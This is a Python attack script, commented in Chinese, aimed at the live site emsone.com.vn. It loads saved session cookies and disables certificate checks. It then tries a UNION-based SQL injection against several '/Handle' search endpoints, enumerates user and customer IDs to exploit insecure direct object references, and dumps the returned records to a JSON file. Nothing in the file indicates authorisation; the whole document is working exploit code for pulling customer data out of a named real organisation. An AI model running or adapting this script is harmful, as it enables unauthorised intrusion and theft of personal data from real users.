#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import re
import time
import urllib3
urllib3.disable_warnings()

class FinalBypassExtract:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def extract_with_handle_endpoint(self):
        """使用Handle端点提取"""
        print("[*] 测试Handle端点...")
        
        # 尝试通过响应差异提取
        endpoints = [
            ('/Handle/SearchListProvince', 'Type'),
            ('/Handle/SearchListWardByDistrictID', 'DistrictID'),
            ('/Handle/SearchListCustomer', 'q'),
        ]
        
        for endpoint, param in endpoints:
            url = f"{self.base_url}{endpoint}"
            
            # 正常请求
            normal_r = self.session.get(f"{url}?{param}=", timeout=10)
            normal_length = len(normal_r.text)
            
            # 测试SQL注入
            test_payload = "1' UNION SELECT 'SQLTEST'--"
            test_url = f"{url}?{param}={urllib.parse.quote(test_payload)}"
            test_r = self.session.get(test_url, timeout=10)
            
            if 'SQLTEST' in test_r.text:
                print(f"    [!] Union注入成功: {endpoint}")
                print(f"        响应: {test_r.text[:300]}")
                return endpoint, param
            
            if len(test_r.text) != normal_length:
                print(f"    [!] 响应长度差异: {endpoint} ({normal_length} vs {len(test_r.text)})")
        
        return None, None
    
    def extract_via_existing_data(self):
        """通过已有数据提取"""
        print("[*] 通过已有数据提取...")
        
        # 已知登录用户ID=4125，尝试提取其他用户
        url = f"{self.base_url}/Handle/SearchListProvince?Type="
        
        # 尝试通过IDOR端点提取用户信息
        test_ids = [4124, 4125, 4126, 1, 2, 999999]
        for uid in test_ids:
            try:
                # 尝试不同的端点组合
                test_urls = [
                    f"{self.base_url}/Handle/SearchListCustomer?CustomerID={uid}",
                    f"{self.base_url}/Handle/SearchListCustomer?ID={uid}",
                    f"{self.base_url}/Handle/SearchListCustomer?user_id={uid}",
                ]
                
                for test_url in test_urls:
                    r = self.session.get(test_url, timeout=10)
                    if r.status_code == 200 and len(r.text) > 10:
                        try:
                            data = json.loads(r.text)
                            if isinstance(data, list) and len(data) > 0:
                                print(f"    [!] 发现数据: {test_url}")
                                print(f"        数据: {data[:2]}")
                                self.db_info['extracted_data'] = data
                                return data
                        except:
                            if 'customer' in r.text.lower() or 'user' in r.text.lower():
                                print(f"    [!] 可能包含用户数据: {test_url}")
            except:
                pass
        
        return None
    
    def extract_via_known_api(self):
        """通过已知API提取"""
        print("[*] 通过已知API提取...")
        
        # 已知有效的端点
        known_endpoints = [
            ('/Handle/SearchListProvince', {}),
            ('/Handle/SearchListWardByDistrictID', {'DistrictID': 1}),
        ]
        
        extracted = {}
        
        for endpoint, params in known_endpoints:
            url = f"{self.base_url}{endpoint}"
            query = "&".join([f"{k}={v}" for k, v in params.items()])
            test_url = f"{url}?{query}"
            
            try:
                r = self.session.get(test_url, timeout=10)
                if r.status_code == 200:
                    try:
                        data = json.loads(r.text)
                        if isinstance(data, list):
                            extracted[endpoint] = {
                                'count': len(data),
                                'sample': data[:3]
                            }
                            print(f"    [+] {endpoint}: {len(data)} 条记录")
                    except:
                        pass
            except:
                pass
        
        if extracted:
            self.db_info['api_data'] = extracted
            return extracted
        
        return None
    
    def save_results(self):
        """保存结果"""
        with open('database_final_extracted.json', 'w', encoding='utf-8') as f:
            json.dump(self.db_info, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 数据已保存")
    
    def run_all(self):
        """执行所有提取"""
        print("="*60)
        print("最终绕过提取")
        print("="*60)
        
        # 方法1: Handle端点
        endpoint, param = self.extract_with_handle_endpoint()
        
        # 方法2: 通过已有数据
        self.extract_via_existing_data()
        
        # 方法3: 通过已知API
        self.extract_via_known_api()
        
        self.save_results()
        
        print("\n" + "="*60)
        print("提取完成")
        print("="*60)
        
        # 输出结果
        if self.db_info:
            print("\n提取的数据:")
            for k, v in self.db_info.items():
                if isinstance(v, list):
                    print(f"  {k}: {len(v)} 条")
                elif isinstance(v, dict):
                    print(f"  {k}: {len(v)} 项")
                else:
                    print(f"  {k}: {v}")

if __name__ == "__main__":
    extractor = FinalBypassExtract()
    extractor.run_all()